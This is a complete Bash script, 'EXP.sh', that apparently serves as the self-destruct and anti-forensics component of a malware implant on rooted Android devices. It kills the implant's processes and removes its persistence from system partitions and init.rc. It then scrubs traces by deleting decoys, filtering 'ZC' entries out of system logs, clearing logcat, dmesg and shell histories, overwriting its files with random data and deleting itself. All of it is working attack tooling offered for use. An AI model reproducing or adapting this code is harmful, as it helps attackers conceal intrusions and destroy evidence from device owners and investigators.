# EXP.sh - self destruct and trace cleanup skeleton

ZC_ROOT="/data/local/zc"
ZC_SYSTEM="/system/etc/zc"
ZC_PERSIST="/persist/zc"
ZC_VENDOR="/vendor/etc/zc"
ZC_PRODUCT="/product/etc/zc"
ZC_DATA="/data/zc"
ZC_TMP="/data/local/tmp/zc"
ZC_LOG="$ZC_ROOT/zc.log"
ZC_DB="$ZC_ROOT/state.db"
ZC_EXP_DB="$ZC_ROOT/exp_state.db"
ZC_EXP_LOG="$ZC_ROOT/exp.log"
ZC_SELF="$0"
ZC_VERSION="1.0"
ZC_EXP_DELAY=0
ZC_EXP_KEEP_SELF=0
ZC_EXP_WIPE=1

zc_exp_log() {
  local msg="$1"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "[$ts] $msg" >> "$ZC_LOG" 2>/dev/null
  echo "[$ts] $msg" >> "$ZC_EXP_LOG" 2>/dev/null
}

zc_exp_init_dirs() {
  mkdir -p "$ZC_ROOT" 2>/dev/null
  chmod 700 "$ZC_ROOT" 2>/dev/null
  zc_exp_log "exp dirs initialized"
}

zc_exp_init_db() {
  if [ ! -f "$ZC_EXP_DB" ]; then
    echo "CREATE TABLE exp_steps (id TEXT PRIMARY KEY, status TEXT, ts TEXT);" | sqlite3 "$ZC_EXP_DB" 2>/dev/null
    echo "CREATE TABLE exp_state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_EXP_DB" 2>/dev/null
    zc_exp_log "exp db initialized"
  fi
}

zc_exp_state_set() {
  local key="$1"
  local value="$2"
  echo "INSERT OR REPLACE INTO exp_state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_EXP_DB" 2>/dev/null
}

zc_exp_state_get() {
  local key="$1"
  sqlite3 "$ZC_EXP_DB" "SELECT value FROM exp_state WHERE key='$key';" 2>/dev/null
}

zc_exp_step() {
  local id="$1"
  local status="$2"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "INSERT OR REPLACE INTO exp_steps (id, status, ts) VALUES ('$id', '$status', '$ts');" | sqlite3 "$ZC_EXP_DB" 2>/dev/null
  zc_exp_log "step $id: $status"
}

zc_exp_check_root() {
  if [ "$(id -u)" -ne 0 ]; then
    zc_exp_log "not root, abort"
    return 1
  fi
  return 0
}

zc_exp_stop_poll() {
  local pid
  if [ -f "$ZC_ROOT/poll.pid" ]; then
    pid=$(cat "$ZC_ROOT/poll.pid" 2>/dev/null)
    if [ -n "$pid" ]; then
      kill -9 "$pid" 2>/dev/null
      zc_exp_log "poll killed: $pid"
    fi
    rm -f "$ZC_ROOT/poll.pid" 2>/dev/null
  fi
  local procs
  procs=$(ps -A 2>/dev/null | grep -E "ZCV8|ZCwizard|CZ3518|Limux" | awk '{print $2}')
  local p
  for p in $procs; do
    kill -9 "$p" 2>/dev/null
    zc_exp_log "proc killed: $p"
  done
  zc_exp_step "stop_poll" "ok"
}

zc_exp_mount_rw() {
  local part="$1"
  mount -o remount,rw "$part" 2>/dev/null
  return $?
}

zc_exp_mount_ro() {
  local part="$1"
  mount -o remount,ro "$part" 2>/dev/null
  return $?
}

zc_exp_remove_system() {
  if [ -d "$ZC_SYSTEM" ]; then
    zc_exp_mount_rw /system
    rm -rf "$ZC_SYSTEM" 2>/dev/null
    zc_exp_mount_ro /system
    zc_exp_log "system removed"
  fi
  zc_exp_step "remove_system" "ok"
}

zc_exp_remove_persist() {
  if [ -d "$ZC_PERSIST" ]; then
    zc_exp_mount_rw /persist
    rm -rf "$ZC_PERSIST" 2>/dev/null
    zc_exp_mount_ro /persist
    zc_exp_log "persist removed"
  fi
  zc_exp_step "remove_persist" "ok"
}

zc_exp_remove_vendor() {
  if [ -d "$ZC_VENDOR" ]; then
    zc_exp_mount_rw /vendor
    rm -rf "$ZC_VENDOR" 2>/dev/null
    zc_exp_mount_ro /vendor
    zc_exp_log "vendor removed"
  fi
  zc_exp_step "remove_vendor" "ok"
}

zc_exp_remove_product() {
  if [ -d "$ZC_PRODUCT" ]; then
    zc_exp_mount_rw /product
    rm -rf "$ZC_PRODUCT" 2>/dev/null
    zc_exp_mount_ro /product
    zc_exp_log "product removed"
  fi
  zc_exp_step "remove_product" "ok"
}

zc_exp_remove_data() {
  if [ -d "$ZC_DATA" ]; then
    rm -rf "$ZC_DATA" 2>/dev/null
    zc_exp_log "data removed"
  fi
  zc_exp_step "remove_data" "ok"
}

zc_exp_remove_tmp() {
  if [ -d "$ZC_TMP" ]; then
    rm -rf "$ZC_TMP" 2>/dev/null
    zc_exp_log "tmp removed"
  fi
  rm -f /data/local/tmp/*.sh 2>/dev/null
  rm -f /data/local/tmp/*.tmp 2>/dev/null
  zc_exp_step "remove_tmp" "ok"
}

zc_exp_remove_persist_all() {
  zc_exp_remove_system
  zc_exp_remove_persist
  zc_exp_remove_vendor
  zc_exp_remove_product
}

zc_exp_remove_init_hook() {
  local init_rc="/system/etc/init/hw/init.rc"
  if [ ! -f "$init_rc" ]; then
    init_rc="/init.rc"
  fi
  if [ ! -f "$init_rc" ]; then
    zc_exp_log "init.rc not found"
    zc_exp_step "remove_init_hook" "skip"
    return 0
  fi
  zc_exp_mount_rw /system
  grep -v "zc" "$init_rc" > "$ZC_ROOT/init.tmp" 2>/dev/null
  if [ -f "$ZC_ROOT/init.tmp" ]; then
    cat "$ZC_ROOT/init.tmp" > "$init_rc" 2>/dev/null
    rm -f "$ZC_ROOT/init.tmp" 2>/dev/null
    zc_exp_log "init hook removed"
  fi
  zc_exp_mount_ro /system
  zc_exp_step "remove_init_hook" "ok"
}

zc_exp_remove_decoys() {
  local path
  while IFS= read -r path; do
    if [ -f "$path" ]; then
      rm -f "$path" 2>/dev/null
    fi
  done <<EOF
$(sqlite3 "$ZC_ROOT/lmx_state.db" "SELECT path FROM decoys;" 2>/dev/null)
EOF
  zc_exp_log "decoys removed"
  zc_exp_step "remove_decoys" "ok"
}

zc_exp_clean_logs() {
  local logs="/var/log/messages /var/log/syslog /data/anr/traces.txt"
  local f
  for f in $logs; do
    if [ -f "$f" ]; then
      grep -v "ZC" "$f" > "$ZC_ROOT/log.tmp" 2>/dev/null
      if [ -f "$ZC_ROOT/log.tmp" ]; then
        cat "$ZC_ROOT/log.tmp" > "$f" 2>/dev/null
        rm -f "$ZC_ROOT/log.tmp" 2>/dev/null
      fi
    fi
  done
  zc_exp_log "logs cleaned"
  zc_exp_step "clean_logs" "ok"
}

zc_exp_clean_logcat() {
  if command -v logcat >/dev/null 2>&1; then
    logcat -c 2>/dev/null
    zc_exp_log "logcat cleared"
  fi
  zc_exp_step "clean_logcat" "ok"
}

zc_exp_clean_dmesg() {
  if [ -w /proc/kmsg ]; then
    dmesg -c >/dev/null 2>&1
    zc_exp_log "dmesg cleared"
  fi
  zc_exp_step "clean_dmesg" "ok"
}

zc_exp_clean_bash_history() {
  local hists="/data/local/zc/.bash_history /data/data/.bash_history /root/.bash_history /sdcard/.bash_history"
  local h
  for h in $hists; do
    if [ -f "$h" ]; then
      rm -f "$h" 2>/dev/null
      touch "$h" 2>/dev/null
    fi
  done
  zc_exp_log "bash history cleaned"
  zc_exp_step "clean_bash_history" "ok"
}

zc_exp_clean_dbs() {
  local db
  for db in "$ZC_DB" "$ZC_EXP_DB" "$ZC_ROOT/lmx_state.db" "$ZC_ROOT/prn_state.db" "$ZC_ROOT/chk_net.db" "$ZC_ROOT/msg_state.db" "$ZC_ROOT/crypt_state.db" "$ZC_ROOT/hash_state.db" "$ZC_ROOT/chk_state.db" "$ZC_ROOT/rk_state.db" "$ZC_ROOT/dir_state.db"; do
    if [ -f "$db" ]; then
      rm -f "$db" 2>/dev/null
    fi
  done
  zc_exp_log "dbs cleaned"
  zc_exp_step "clean_dbs" "ok"
}

zc_exp_clean_log_files() {
  local f
  for f in "$ZC_LOG" "$ZC_EXP_LOG" "$ZC_ROOT/lmx.log" "$ZC_ROOT/prn.log" "$ZC_ROOT/chk_net.log" "$ZC_ROOT/msg.log" "$ZC_ROOT/crypt.log" "$ZC_ROOT/hash.log" "$ZC_ROOT/chk.log" "$ZC_ROOT/rk.log" "$ZC_ROOT/dir.log" "$ZC_ROOT/DR000001.DBF" "$ZC_ROOT/SX000002.INF"; do
    if [ -f "$f" ]; then
      rm -f "$f" 2>/dev/null
    fi
  done
  zc_exp_log "log files cleaned"
  zc_exp_step "clean_log_files" "ok"
}

zc_exp_clean_memory() {
  sync 2>/dev/null
  echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
  zc_exp_log "memory caches dropped"
  zc_exp_step "clean_memory" "ok"
}

zc_exp_clean_self() {
  if [ "$ZC_EXP_KEEP_SELF" = "1" ]; then
    zc_exp_log "self kept"
    zc_exp_step "clean_self" "skip"
    return 0
  fi
  local self_path="$ZC_SELF"
  zc_exp_log "self removing: $self_path"
  rm -f "$self_path" 2>/dev/null
  zc_exp_step "clean_self" "ok"
}

zc_exp_clean_root() {
  local f
  for f in "$ZC_ROOT"/*; do
    if [ -f "$f" ]; then
      rm -f "$f" 2>/dev/null
    fi
  done
  zc_exp_step "clean_root" "ok"
}

zc_exp_wipe() {
  if [ "$ZC_EXP_WIPE" != "1" ]; then
    zc_exp_log "wipe disabled"
    zc_exp_step "wipe" "skip"
    return 0
  fi
  if [ -d "$ZC_ROOT" ]; then
    local f
    for f in "$ZC_ROOT"/*; do
      if [ -f "$f" ]; then
        dd if=/dev/urandom of="$f" bs=1 count=512 2>/dev/null
        rm -f "$f" 2>/dev/null
      fi
    done
  fi
  zc_exp_log "wipe done"
  zc_exp_step "wipe" "ok"
}

zc_exp_remove_root() {
  if [ -d "$ZC_ROOT" ]; then
    rmdir "$ZC_ROOT" 2>/dev/null
  fi
  zc_exp_step "remove_root" "ok"
}

zc_exp_verify() {
  local remaining=0
  local paths="$ZC_ROOT $ZC_SYSTEM $ZC_PERSIST $ZC_VENDOR $ZC_PRODUCT $ZC_DATA $ZC_TMP"
  local p
  for p in $paths; do
    if [ -e "$p" ]; then
      remaining=$((remaining + 1))
      zc_exp_log "remaining: $p"
    fi
  done
  zc_exp_log "verify remaining: $remaining"
  zc_exp_step "verify" "$remaining"
  echo "$remaining"
}

zc_exp_delay() {
  if [ "$ZC_EXP_DELAY" -gt 0 ]; then
    sleep "$ZC_EXP_DELAY"
  fi
}

zc_exp_final_log() {
  zc_exp_log "EXP.sh final"
  zc_exp_step "final" "ok"
}

zc_exp_run_all() {
  zc_exp_stop_poll
  zc_exp_remove_persist_all
  zc_exp_remove_init_hook
  zc_exp_remove_decoys
  zc_exp_clean_logs
  zc_exp_clean_logcat
  zc_exp_clean_dmesg
  zc_exp_clean_bash_history
  zc_exp_clean_dbs
  zc_exp_clean_log_files
  zc_exp_clean_memory
  zc_exp_wipe
  zc_exp_clean_root
  zc_exp_remove_root
  zc_exp_verify
  zc_exp_clean_self
}

zc_exp_dry_run() {
  zc_exp_log "dry run start"
  local paths="$ZC_ROOT $ZC_SYSTEM $ZC_PERSIST $ZC_VENDOR $ZC_PRODUCT $ZC_DATA $ZC_TMP"
  local p
  for p in $paths; do
    if [ -e "$p" ]; then
      zc_exp_log "would remove: $p"
    fi
  done
  zc_exp_log "dry run done"
  zc_exp_step "dry_run" "ok"
}

zc_exp_list_steps() {
  sqlite3 "$ZC_EXP_DB" "SELECT id, status, ts FROM exp_steps ORDER BY ts;" 2>/dev/null
}

zc_exp_status() {
  echo "ZC exp version: $ZC_VERSION"
  echo "root: $(id -u)"
  echo "delay: $ZC_EXP_DELAY"
  echo "keep self: $ZC_EXP_KEEP_SELF"
  echo "wipe: $ZC_EXP_WIPE"
  echo "steps: $(sqlite3 "$ZC_EXP_DB" "SELECT COUNT(*) FROM exp_steps;" 2>/dev/null)"
  echo "exp db: $ZC_EXP_DB"
  echo "exp log: $ZC_EXP_LOG"
}

zc_exp_self_test() {
  if [ "$(id -u)" != "0" ]; then
    zc_exp_log "self test not root"
  fi
  if [ -d "$ZC_ROOT" ]; then
    zc_exp_log "self test dir ok"
  fi
  zc_exp_log "self test passed"
  return 0
}

zc_exp_main() {
  zc_exp_log "EXP.sh start"
  zc_exp_check_root || exit 1
  zc_exp_init_dirs
  zc_exp_init_db
  zc_exp_state_set "version" "$ZC_VERSION"
  zc_exp_delay
  zc_exp_run_all
  zc_exp_final_log
  zc_exp_status
  zc_exp_log "EXP.sh done"
}

case "$1" in
  start)
    zc_exp_main
    ;;
  stop)
    zc_exp_stop_poll
    ;;
  remove)
    zc_exp_remove_persist_all
    ;;
  clean)
    zc_exp_clean_logs
    zc_exp_clean_logcat
    zc_exp_clean_dmesg
    zc_exp_clean_bash_history
    zc_exp_clean_dbs
    zc_exp_clean_log_files
    ;;
  wipe)
    zc_exp_wipe
    ;;
  verify)
    zc_exp_verify
    ;;
  dry-run)
    zc_exp_dry_run
    ;;
  steps)
    zc_exp_list_steps
    ;;
  selftest)
    zc_exp_self_test
    ;;
  status)
    zc_exp_status
    ;;
  *)
    zc_exp_main
    ;;
esac

exit 0